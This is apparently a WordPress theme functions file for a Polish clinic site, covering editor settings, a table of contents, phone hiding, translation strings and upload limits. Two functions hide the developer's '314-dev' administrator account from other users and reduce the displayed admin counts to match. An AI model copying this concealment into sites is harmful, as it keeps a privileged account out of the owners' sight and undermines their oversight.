<?php

/**
 * Theme functions file
 * 
 * This file is attached to functions.php.
 * It contains all functions that are not numerous enough to warrant a separate file.
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Functions
 * @since 1.0
 * @author Amelia
 */

/*
=====================================
	HIDE ADMIN BAR
=====================================
*/
//show_admin_bar(false);

/*
==========================================
	REMOVE EDITOR FROM POST AND PAGES
==========================================
*/
// add_action( 'init', function() {
// 	//remove_post_type_support( 'post', 'editor' );
// 	//remove_post_type_support( 'page', 'editor' );
// }, 99);

/*
===============================================
	REMOVE GUTENBERG & GUTENBERG STYLES FROM WP
===============================================
*/
add_filter('use_block_editor_for_post', '__return_false', 10);

/**
 * Dequeues gutenberg styles
 * 
 * @author Amelia
 * @since 1.0
 * @link https://developer.wordpress.org/reference/functions/wp_dequeue_style/
 */
function pi_remove_wp_block_library_css()
{
	wp_dequeue_style('wp-block-library');
	wp_dequeue_style('wp-block-library-theme');
	wp_dequeue_style('wc-block-style');
}
add_action('wp_enqueue_scripts', 'pi_remove_wp_block_library_css', 100);


/*
=====================================
	REMOVES <P> TAGS FROM CF7
=====================================
*/
add_filter('wpcf7_autop_or_not', '__return_false');


/*
=====================================
	CONTACT FORM 7 SUPPORT
=====================================
*/
//add_filter( 'wpcf7_support_html5_fallback', '__return_true' );

/**
 * Sets excerpt length to a specified value
 * 
 * @author Amelia
 * @since 1.0
 */
function pi_custom_excerpt_length($length)
{
	return 24;
}
add_filter('excerpt_length', 'pi_custom_excerpt_length', 999);

/**
 * Sets a 'see more' string in excerpts
 * 
 * @author Amelia
 * @since 1.0
 */
function pi_excerpt_more($more)
{
	return '...';
}
add_filter('excerpt_more', 'pi_excerpt_more');

/**
 * Generates and renders a custom pagination block
 * 
 * @param WP_Query $loop query instance to generate pagination of
 * @param string $prev text to display when rendering a 'previous' button
 * @param string $next text to display when rendering a 'next' button
 */
function custom_pagination($loop, $prev, $next)
{
	echo paginate_links(array(
		'base'         => str_replace(999999999, '%#%', esc_url(get_pagenum_link(999999999))),
		'total'        => $loop->max_num_pages,
		'current'      => max(1, get_query_var('paged')),
		'format'       => '?paged=%#%',
		'show_all'     => false,
		'type'         => 'plain',
		'end_size'     => 5,
		'mid_size'     => 1,
		'prev_next'    => false,
		'prev_text'    => sprintf('<i> < </i> %1$s', pi__($prev, 'text-domain')),
		//'next_text'    => sprintf('%1$s <i> > </i>', pi__($next, 'text-domain')),
		'add_args'     => false,
		'add_fragment' => '',
	));
}


/*
===============================
	ACF OPTION PAGES
===============================
*/
if (function_exists('acf_add_options_page')) {
	// add parent
	$parent = acf_add_options_page(array(
		'menu_title' => '314 Theme',
		'page_title' 	=> '314 Theme',
		'position' => 3,
		'icon_url' => false,
		'redirect' => false,
		'autoload' => true
	));
}

/**
 * Filters ACF relationship fields and removes drafts, trashed posts, etc.
 * 
 * @author Amelia
 * @since 1.0
 * @link https://www.advancedcustomfields.com/resources/acf-format_value/
 * 
 * @param mixed $value field value
 * @param int|string $post_id post ID where the value is saved
 * @param array $field field settings array 
 * @return mixed $value filtered field value
 */
function pi_acf_relatioship_returned_value($value, $post_id, $field)
{
	if ($value) {
		$new_value = array();

		foreach ($value as $item) {
			$related_post = get_post($item);

			if ($related_post && $related_post->post_status == 'publish') {
				array_push($new_value, $item);
			}
		}
		$value = $new_value;
	}
	return $value;
}
add_filter('acf/format_value/type=relationship', 'pi_acf_relatioship_returned_value', 10, 3);


/**
 * Adds a shortcode for rendering a map
 * 
 * @author Amelia
 * @since 1.0
 */
function pi_map_shortcode()
{
	$locations = get_field('lokalizacje', 'options');
	if (!$locations) return;
	ob_start();
	foreach ($locations as $location) {
		echo $location['map'];
		break;
	}
	return ob_get_clean();
}
add_shortcode('pimap', 'pi_map_shortcode');


/**
 * Injects SVGs in Owl Carousel. Use it to fix hidden SVGs not parsing to a tree in a carousel.
 * 
 * @author Unknown
 * @since 1.0
 * 
 * @param string $path url path to the resource
 * @return string|bool result on success, false on failure
 */
function pi_file_get_contents($path)
{
	$url = trim($path);
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$data = curl_exec($ch);
	curl_close($ch);
	return $data;
}


/**
 * Adds ids to headlines in the content
 * 
 * @author Amelia
 * @since 1.0
 * @todo html content should not be regexed, refactor using xpath?
 * @todo document
 * 
 * @param string $content the content
 * @return string $content
 */
function add_id_to_headlines($content)
{
	$pattern = '#(?P<full_tag><(?P<tag_name>h\d)(?P<tag_extra>[^>]*)>(?P<tag_contents>[^<]*)</h\d>)#i';
	if (preg_match_all($pattern, $content, $matches, PREG_SET_ORDER)) {
		$find = array();
		$replace = array();
		foreach ($matches as $match) {
			if (strlen($match['tag_extra']) && false !== stripos($match['tag_extra'], 'id=')) {
				continue;
			}
			$find[]    = $match['full_tag'];
			$id        = sanitize_title($match['tag_contents']);
			$id_attr   = sprintf(' id="%s"', $id);
			$extra     = '';
			$replace[] = sprintf('<%1$s%2$s><span%3$s></span>%4$s%5$s</%1$s>', $match['tag_name'], $match['tag_extra'], $id_attr, $match['tag_contents'], $extra);
		}
		$content = str_replace($find, $replace, $content);
	}
	return $content;
}
add_filter('the_content', 'add_id_to_headlines');


/**
 * Creates a table of contents
 * 
 * This fucntion will parse a string of content(like the_content, text with html tags),
 * extract headers and generate a ToC block from it. 
 * 
 * @author Amelia
 * @since 1.0
 * @todo html content should not be regexed, refactor using xpath?
 * 
 * @param array $attr array of attributes, currently only 'post_id' is recognized
 * @return string|void $html generated ToC block
 */
function pi_table_of_contents($attr)
{
	$html = '';
	$permalink = '';

	// POST ID (PASSED OR CURRENT POST ID)
	$post_id = get_the_ID();
	if ($attr && array_key_exists('post_id', $attr)) {
		$post_id = $attr['post_id'];

		if ($post_id != get_the_ID()) {
			$permalink = get_permalink($post_id);
		}
	}
	// CHECK CONTENT OF POST
	$content = get_post_field('post_content', $post_id);
	$html = $content ?: 'ERROR: There is no content for post with id ' . $post_id;

	// SCAN CONTENT
	$pattern = '#(?P<full_tag><(?P<tag_name>h\d)(?P<tag_extra>[^>]*)>(?P<tag_contents>[^<]*)</h\d>)#i';
	if (preg_match_all($pattern, $content, $matches, PREG_SET_ORDER) || get_field('faq', $post_id) || get_related_metamorph($post_id) || detect_pricetables($post_id)) {
		$find = array();
		$replace = array();
		foreach ($matches as $match) {
			if (strlen($match['tag_extra']) && false !== stripos($match['tag_extra'], 'id=')) {
				continue;
			}
			$find[]    = $match['full_tag'];
			$id        = sanitize_title($match['tag_contents']);
			$id_attr   = sprintf(' id="%s"', $id);
			$extra     = '';
			$replace[] = sprintf('<%1$s%2$s%3$s>%4$s%5$s</%1$s>', $match['tag_name'], $match['tag_extra'], $id_attr, $match['tag_contents'], $extra);
		}

		// CREATE TABLE OF CONTENT
		$html = '<div class="table-of-contents"> <h6>' . pi__('Spis treści', 'ok') . ' </h6>
			<ul class="js-table-of-contents table-of-contents__list">';

		if ($content) {
			$content = str_replace($find, $replace, $content);
			$domDoc = new DOMDocument();
			$domDoc->loadHTML(mb_convert_encoding($content, 'HTML-ENTITIES', 'UTF-8'), LIBXML_HTML_NODEFDTD | LIBXML_NOERROR); //convert into dom document
			$xpath = new DOMXpath($domDoc);
			$headers = $xpath->query('//h1 | //h2 | //h3 | //h4 | //h5 | //h6');
			foreach ($headers as $header) {
				$html .= '<li> <a href="' . $permalink . '#' . $header->getAttribute('id') . '"> ' . $header->nodeValue . '</a></li>';
			}
		}



		if (get_field('faq', $post_id)) {
			$html .= '<li> <a href="' . $permalink . '#faq"> ' . pi__('Najczęściej zadawane pytania', 'ok') . '</a></li>';
		}

		if (get_related_metamorph($post_id)) {
			$html .= '<li> <a href="' . $permalink . '#metamorphosis">  ' . pi__('Metamorfozy', 'ok') . '  </a></li>';
		}

		if (detect_pricetables($post_id)) {
			$html .= '<li> <a href="' . $permalink . '#cennik"> ' . pi__('Cennik zabiegów', 'ok') . ' </a></li>';
		}

		$html .= '<li> <a href="#testimonials"> ' . pi__('Opinie pacjentów', 'pi') . ' </a></li>';

		$html .= '<li> <a href="#contact-section"> ' . pi__('Kontakt', 'pi') . ' </a></li>';

		$html .= '</ul>
			<a href="#" class="btn btn--secondary d-none js-show-table-of-contents">' . pi__('Rozwiń spis treści', 'ok') . '</a>
			</div>';
		return $html;
	} else {
		return;
	}
}
// register shortcode
add_shortcode('pi_toc', 'pi_table_of_contents');


/**
 * Detect if a pricetable exists
 * 
 * This function is used in a few templates to detect that pricetable for this related element (eg. offer)
 * exists. If it does this function will return it in an array.
 * 
 * @author Amelia
 * @since 1.0
 * 
 * @param int $id post id of the post to check
 * @return array $pricetables array of pricetables, or empty array if no pricetables were found
 */
function detect_pricetables($id)
{
	$pricetables = array();
	$relationshipTerms = get_the_terms($id, 'offer-relationship'); //grab the relationship data
	if (!$relationshipTerms) return $pricetables;
	$relationshipTerms = array_column($relationshipTerms, 'term_id');
	if (have_rows('pricetables', 83)) :
		while (have_rows('pricetables', 83)) : the_row();
			$related_offer = get_sub_field('related_offer');
			if ($related_offer && !empty(array_intersect($related_offer, $relationshipTerms))) :
				array_push($pricetables, get_sub_field('pricetable'));
			endif;
		endwhile;
	endif;

	return $pricetables;
}


/**
 * Create a new shortcode that renders a hideable phone number
 * 
 * example usage <?php echo do_shortcode('[hidden-number phone="+48 123 456 789"]'); ?>
 * This is a callback to add_shortcode.
 * 
 * @author Amelia
 * @since 1.0
 * 
 * @param array $args argument array. all args other than phone are optional
 * @param array $args['phone'] phone number to hide
 * @return string|null HTML phone anchor constructed based on shortcode args or null if field name is invalid
 */
function phone_hider_shortcode_callback($args = array())
{
	$hideEnabled = get_field('hide_phones', 'options'); //as long a autoload is enabled this shouldn't increase number of queries
	$a = shortcode_atts(array(
		'phone' => null, //name of the field with the phone number
		'hidden-class' => 'hidden-no', //class to apply to the hidden phone number
		'hidden-class-additional' => '', //additional classes to apply to hidden no
		'visible-class' => 'visible-no', //class to apply to the revealed phone number
		'visible-class-additional' => '', //additional classes to apply to hidden no
		'hidden-text' => 'zobacz', //bracketed text in the hidden no.
		'substr' => 11, //how many characters to show in the hidden no.
		'always-show' => false, //if true, will render a whole phone number, without hiding
		'bs-breakpoint' => 'sm', //mobile breakpoint below which a revealed number will be displayed
	), $args);
	$phoneNo = $a['phone'];
	if (!$phoneNo) return null;
	$link = '';
	if ($a['always-show'] || !$hideEnabled) {
		$link = '<a href="tel:' . $phoneNo . '" class="' . $a['visible-class'] . ' ' . $a['visible-class-additional'] . '">' . $phoneNo . '</a>';
	} else {
		$link = '<a href="#tel" class="' . $a['hidden-class'] . ' d-none d-' . $a['bs-breakpoint'] . '-inline ' . $a['hidden-class-additional'] . '">' . substr($phoneNo, 0, $a['substr']) . '... [' . $a['hidden-text'] . ']</a>';
		$link .= '<a href="tel:' . str_replace(' ', '', $phoneNo) . '" class="' . $a['visible-class'] . ' d-' . $a['bs-breakpoint'] . '-none ' . $a['visible-class-additional'] . '">' . $phoneNo . '</a>';
	}
	return $link;
}
add_shortcode('hidden-number', 'phone_hider_shortcode_callback');


/**
 * Get a social media icon
 * 
 * Does not return anything, instead it renders the icon code directly.
 * 
 * @author Amelia
 * @since 1.0
 * 
 * @param string $i icon string identifier
 */
function get_social_media_icon($i)
{
	switch ($i) {
		case 'facebook':
			echo '<i class="icon-facebook"></i>';
			break;

		case 'instagram':
			echo '<i class="icon-instagram"></i>';
			break;

		case 'linkedin':
			echo '<i class="icon-linkedin"></i>';
			break;

		case 'twitter':
			echo '<i class="icon-twitter"></i>';
			break;

		case 'google':
			echo '<i class="icon-google"></i>';
			break;

		case 'youtube':
			echo '<i class="icon-youtube"></i>';
			break;

		case 'znanylekarz':
			echo '<i class="icon-znanylekarz"></i>';
			break;
	}
}


/**
 * Change the wp_login logo to a custom one.
 * 
 * This method hooks into login_enqueue_scripts to directly render a custom logo
 * 
 * @author Amelia
 * @since 1.0
 */
function pi_custom_login_logo()
{
	$logo = get_field('logo', 'options');
	if ($logo) {
?>
		<style type="text/css">
			#login h1 a,
			.login h1 a {
				background-image: url(<?php echo $logo['url']; ?>);
				height: 65px;
				width: 320px;
				background-size: 320px 65px;
				background-repeat: no-repeat;
				padding-bottom: 8px;
				pointer-events: none;
			}
		</style>
<?php
	}
}
add_action('login_enqueue_scripts', 'pi_custom_login_logo');


/**
 * Outputs localized string if a custom translation function exists, otherwise outputs native translation function output
 * 
 * @author MichalB
 * @since 1.0
 *
 * @param string $string Text to translate.
 * @param string $domain Text domain. Unique identifier for retrieving translated strings. Used by native WP function.
 * @return null
 */
function pi_e($string = '', $domain = 'default')
{
	add_to_string_display_cache($string);
	if (function_exists('pll_e')) {
		pll_e($string);
	} else {
		_e($string, $domain);
	}
}

/**
 * Returns localized string if a custom translation function exists, otherwise returns native translation function output
 * 
 * @author MichalB
 * @since 1.0
 *
 * @param string $string Text to translate.
 * @param string $domain Text domain. Unique identifier for retrieving translated strings. Used by native WP function.
 * @return null
 */
function pi__($string = '', $domain = 'default')
{
	add_to_string_display_cache($string);
	if (function_exists('pll__')) {
		return pll__($string);
	} else {
		return __($string, $domain);
	}
}


/**
 * Adds a string into an array of cached strings
 * 
 * These are cached so they can be entered into a transitionary ACF field containing all translateable strings
 * @author MichalB
 * @since 1.0
 * 
 * @param string $value text string
 * @return void
 */
function add_to_string_display_cache($value)
{
	$strings = wp_cache_get('pi_translation_strings');
	if ($strings === false) {
		return wp_cache_set('pi_translation_strings', [$value]);
	} else {
		array_push($strings, $value);
		wp_cache_set('pi_translation_strings', $strings);
	}
}


/**
 * Gets every string from the cache field and updates a transitionary ACF field with imploded values
 * @author MichalB
 * @since 1.0
 */
function update_string_display_field()
{
	$strings = wp_cache_get('pi_translation_strings');
	$field = get_field('pi_translation_strings', 'options');
	if ($strings === false || $field === false) return;
	$field = explode('<br>', $field);
	$newField = array_unique(array_merge($strings, $field));
	update_field('pi_translation_strings', implode('<br>', $newField), 'options');
}
add_action('wp_print_footer_scripts', 'update_string_display_field');

/**
 * Disables the string field to prevent editing
 * @param array $field array of field data
 * @return null|array
 */
function load_debug_field($field)
{
	$field['disabled'] = 1;
	return $field;
}
add_action('acf/load_field/key=field_6526771aeebc7', 'load_debug_field', 9, 1);

/**
 * Adds string listing below the autotranslate field
 * 
 * @author MichalB
 * @since 1.1
 * 
 * @param array $field array of field data
 * @return null|array
 */
function render_debug_field($field)
{
	global $current_user;
	if ($current_user->user_login === '314-dev' && $field['key'] === 'field_6526771aeebc7') {
		echo '<div style="padding: 16px;">==== START pi_translation_strings ====<br>';
		echo '<strong>Przecrawluj stronę ScreamingFrogiem i wszystkie ciągi znaków powinny się zarejestrować.</strong> <br><br>';
		the_field('pi_translation_strings', 'options');
		echo '<br><br>==== END pi_translation_strings ====<br><br></div>';
	}
	return $field;
}
add_action('acf/render_field/key=field_6526771aeebc7', 'render_debug_field', 9, 1);

/**
 * Intercepts and disables some dev fields if not loged in as 314 user
 * 
 * @author MichalB
 * @since 1.1
 * 
 * @param array $field array of field data
 * @return null|array
 */
function intercept_fields($field)
{
	global $current_user;
	if ($current_user->user_login === '314-dev') return $field;
	return false;
}
add_filter("acf/prepare_field/key=field_6568697860925", "intercept_fields"); //dynamic sorting
add_filter("acf/prepare_field/key=field_6540d1fdbb644", "intercept_fields");
add_filter("acf/prepare_field/key=field_6569a1b04aad7", "intercept_fields");

add_filter("acf/prepare_field/key=field_65267745eebc8", "intercept_fields"); //debug tab
add_filter("acf/prepare_field/key=field_6526771aeebc7", "intercept_fields");


/**
 * Automatically registers all translateable strings based on an ACF field containing them.
 * @author MichalB
 * @since 1.0
 */
function autoregister_strings()
{
	if (!function_exists('pll_register_string')) return;
	$field = get_field('pi_translation_strings', 'options');
	if ($field === false) return;
	$field = explode('<br>', $field);
	foreach ($field as $string) {
		$string = strip_tags($string);
		pll_register_string($string, $string, 'autoregister');
	}
}
add_action('init', 'autoregister_strings');

/**
 * Hides 314 user on the dashboard if anyone else is logged in
 * This is performed for security purposes
 * @param array $user_search current user search query object
 */
add_action('pre_user_query', 'pi_pre_user_query');
function pi_pre_user_query($user_search)
{
	global $current_user;
	if ($current_user->user_login === '314-dev') return; //abort if it's our user
	global $wpdb;
	$user_search->query_where = str_replace('WHERE 1=1', "WHERE 1=1 AND {$wpdb->users}.user_login != '314-dev'", $user_search->query_where); //replace query part to exclude our login
}


/**
 * Reduces the number of displayed elements count on the user list page by one
 * 
 * This is to maintain consistency with the above hiding function
 * @author MichalB
 * @since 1.0
 */
function pi_list_table_views($views)
{
	global $current_user;
	if ($current_user->user_login === '314-dev') return $views; //abort if it's our user
	$users = count_users();
	$admins_num = $users['avail_roles']['administrator'] - 1; //reduce admin roles by one
	$all_num = $users['total_users'] - 1; //reduce total roles by one
	$class_adm = (strpos($views['administrator'], 'current') === false) ? "" : "current";
	$class_all = (strpos($views['all'], 'current') === false) ? "" : "current";
	//change the render elements
	$views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
	$views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
	return $views;
}
add_filter("views_users", "pi_list_table_views");

/**
 * Add image save/text copy blocking classes when relevant options fields are selected
 * @author MichalB
 * @since 1.0
 */
add_filter('body_class', function ($classes) {
	$blockPics = get_field('hide_image_save_option', 'options') ? 'noimagesave' : '';
	$blockTextCopy = get_field('hide_image_save_option', 'options') ? 'notextcopy' : '';
	return array_merge($classes, array($blockPics, $blockTextCopy));
});


/**
 * Add entries to "offer-display" taxonomy. This taxonomy is read-only.
 */
function pi_add_offer_display_taxonomy()
{
	if (!is_admin()) return; //run only in admin
	$terms = ['show-in-list' => 'Pokaż na liście usług', 'show-in-carousel' => 'Pokaż w karuzeli usług'];
	foreach ($terms as $slug => $name) {
		if (empty(term_exists($slug, 'offer-display'))) {
			wp_insert_term($name, 'offer-display', [
				'slug' => $slug,
			]);
		}
	}
}
add_action('init', 'pi_add_offer_display_taxonomy');

/**
 * Retrieves a related metamorph array
 * 
 * @param int $post_id ID of the post to get related metamorphoses of
 * @since 1.1
 * @author MichalB
 */
function get_related_metamorph($post_id)
{
	if ($related_metamorphosis = wp_cache_get('related-metamorph-' . $post_id)) return $related_metamorphosis;
	$related_metamorphosis = get_posts(array(
		'post_type' => 'metamorphosis',
		'post_status' => 'publish',
		'posts_per_page' => -1,
		'pi_skip_rearrange' => true, //custom flag, prevents the rearrangement action for running. removing this won't break the query, but it's a tiny bit of a performance hit.
		'tax_query' => array(
			array(
				'taxonomy' => 'offer-relationship',
				'terms' => wp_get_post_terms($post_id, 'offer-relationship', array('fields' => 'ids')),
			)
		),
	));
	wp_cache_set('related-metamorph-' . $post_id, $related_metamorphosis, 3600);
	return $related_metamorphosis;
}

/**
 * Returns an array of offer post types (mainly used in queries)
 * 
 * @author MichalB
 * @since 1.1
 * 
 * @return array
 */
function offer_post_types()
{
	return array('offer', 'medicine');
}

/**
 * Limit the file size for images upload
 *
 * @author MichalB
 * @since 1.1
 * 
 * @param $file
 * @return mixed
 */
function limit_upload_image_size($file)
{
	//not all of these are currently supported by wordpress
	$typesToLimit = ['image/jpeg', 'image/png', 'image/gif', 'image/webp', 'image/avif', 'image/bmp', 'image/heic', 'image/heif', 'image/tiff',];

	// 2 MB.
	$maxSize = 2000 * 1024;

	if (in_array($file['type'], $typesToLimit)) {
		if ($file['size'] > $maxSize) {
			$file['error'] = pi__('Maksymalny rozmiar pliku graficznego wynosi 2MB.', 'pi');
		}
	}

	return $file;
}

add_filter('wp_handle_upload_prefilter', 'limit_upload_image_size', 20);
